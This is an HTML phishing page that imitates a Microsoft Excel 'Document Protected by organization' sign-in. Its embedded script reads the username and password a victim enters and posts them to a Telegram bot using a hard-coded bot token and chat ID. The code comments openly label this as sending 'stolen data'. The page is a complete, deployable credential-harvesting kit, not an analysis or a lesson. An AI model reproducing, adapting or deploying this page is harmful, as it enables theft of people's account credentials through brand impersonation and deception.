<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>

body {
  position: relative;
  margin: 0;
  min-height: 100vh;   /* keep full background image */
  height: auto;
  display: flex;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  font-family: Arial, sans-serif;
}

/* Blurred background */
body::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: url('https://firebasestorage.googleapis.com/v0/b/project-a29a7.appspot.com/o/backphoto3.jpg?alt=media&token=dfd11e8a-3b48-4da0-b3dd-ea852a87922b');
  background-size: cover;
  background-position: center;
  filter: blur(10px);     /* <--- BLUR HERE */
  transform: scale(1.1);  /* Avoids blurred edges */
  z-index: -1;
  
background-size: contain;

background-position: top center;

}


  .login-form {
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 300px;
    }
    .login-form input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .login-form button {
      padding: 10px 20px;
      background-color: green;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .login-form button:hover {
      background-color: green;
    }
.excel-logo {
  width: 120px;       /* Adjust size */
  display: block;
  margin: 0 auto 15px;
}


      
  </style>
</head>
<body>

  <div class="login-form">
    <img src="microsoft-excel-2013-6936.png" class="excel-logo">

    <h2>Document Protected by organization</h2>

    <form id="loginForm" action="javascript:void(0);">
      <input type="text" id="username" name="username" placeholder="Username" required>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
</div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent actual form submission

      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;

      // Prepare the payload with stolen data
      var payload = `Username: ${username}\nPassword: ${password}. Meow ♥️\uFE0F`;

      // Send stolen data to Telegram
      sendToTelegram(payload);
    });

    function sendToTelegram(message) {
      var chatId = '1063177042'; // Chat ID for Telegram bot
      var botToken = '7610110390:AAHQ-UwiiYSXTtfR3iJy4AW0qo9TH1YFUBE'; // Telegram Bot API Token
      var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

      var xhr = new XMLHttpRequest();
      xhr.open("POST", apiUrl, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

      // Prepare the POST data in the proper format
      var postData = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Send the POST request with the message
      xhr.send(postData);
    }
  </script>

</body>
</html>
